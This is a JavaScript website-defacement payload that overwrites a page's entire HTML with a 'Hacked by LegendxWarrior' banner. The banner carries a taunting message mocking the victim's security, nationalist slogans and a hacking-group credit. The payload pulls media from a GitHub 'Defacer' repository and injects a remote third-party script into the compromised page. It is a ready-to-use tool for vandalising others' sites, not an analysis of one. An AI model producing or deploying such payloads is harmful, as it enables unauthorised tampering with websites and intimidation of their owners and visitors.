document.querySelector("html").innerHTML = `
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Hacked by Legend</title>
  <link href="https://fonts.googleapis.com/css2?family=Marmelad&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #000;
      color: #fff;
      font-family: 'Marmelad', sans-serif;
      padding: 1vh 2vw;
      text-align: center;
    }

    

    .Main{
      font-size: 6vw;
      color: #FF2727;
      margin-top: 4vh;
      animation: main-anim 10s infinite, shake 3s linear infinite;
    }

  img {
  width: 15%;
  max-width: 500px;
  height: auto;
  margin-top: 0.5vh;
  margin-left: 0.5vh;
  border-radius: 50%;
  display: block;
}
video{
  width: 80vw;
  height: auto;
  z-index: -1;
  margin-top: 3vh;
}
    p {
      font-size: 4vw;
      max-width: 800px;
      margin: 0vh auto 0;
      background: linear-gradient(180deg, #FF7900, white, green);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      color: transparent;
    }

   .show {
      margin-top: 2vw;
      font-size: 3vw;
      color: red;
    }

    .about {
      font-size: 2vw;
      color: #FF8F04;
      margin-top: 6vh;
    }

    @media (min-width: 768px) {
      .Main {
        font-size: 3rem;
      }

      .wish {
        font-size: 4rem;
      }

      p, .show, .about {
        font-size: 1.2rem;
      }
    }

    @keyframes main-anim {
      0% { text-shadow: none; }
      50% {
        text-shadow: -2px -2px 0 #000, 2px 2px 0 #000,
                     15px 15px 15px #FF0000, -15px 15px 15px #FF0000,
                     15px -15px 20px #FF0000, -15px -15px 30px #FF0000;
      }
    }
    @keyframes shake{
      0%{transform: translate(0);}
      25%{transform: translate(1vw);}
      50%{transform: translate(0);}
      75%{transform: translate(-1vw);}
      100%{transform: translate(0);}
}
  </style>
</head>
<body>
    <img src="https://raw.githubusercontent.com/legendxWarrior/Defacer/main/Legendx.png" alt="LegendX">
    
  <h1 class="Main">[+] Hacked by LegendxWarrior [+]</h1>
  
  <video autoplay muted loop playsinline>
    <source src="https://raw.githubusercontent.com/legendxWarrior/Defacer/main/INDIAN_FLAG.mp4" type="video/mp4">
    Indian Flag
  </video>
  <p>
    I find vulnerability and just compromised your system. You need to know more about security because you are a baby in cyber security. I laugh on your security that is compromised by a beginner hacker. I am an Indian and I just hacked your website to show the power of Indian hackers to you.It is just a tailor.Stay warned nothing is secure!!
  </p>
  <div class="show">
    <h2>||  धर्मो रक्षति रक्षितः ||<br>|| भारत माता की जय ||<br>🚩जय श्री राम 🚩<br>⚔️⚔️⚔️</h2>
  </div>
  <div class="about">
    <h1>[•]&nbsp;&nbsp;LegendX&nbsp;&nbsp;[•]</h1>
    <h1>#Team ICC(<span style="color:red">Indian Cyber Club</span>)</h1>
  </div>
  
<script>
  const script = document.createElement("script");
  script.src = "https://aakashbapna.github.io/jet-planes/doodle.js";
  
  // Wait until the script is fully loaded
  script.onload = () => {
    doodle.init("https://aakashbapna.github.io/jet-planes/jet.png");
  };
  
  document.body.appendChild(script);
</script>

  <!-- Canvas -->
  <canvas id="canvas_doodle" height="390" width="423" 
          style="position: fixed; top: 0; left: 0; z-index: -1; pointer-events: none;">
  </canvas>
</body>

`;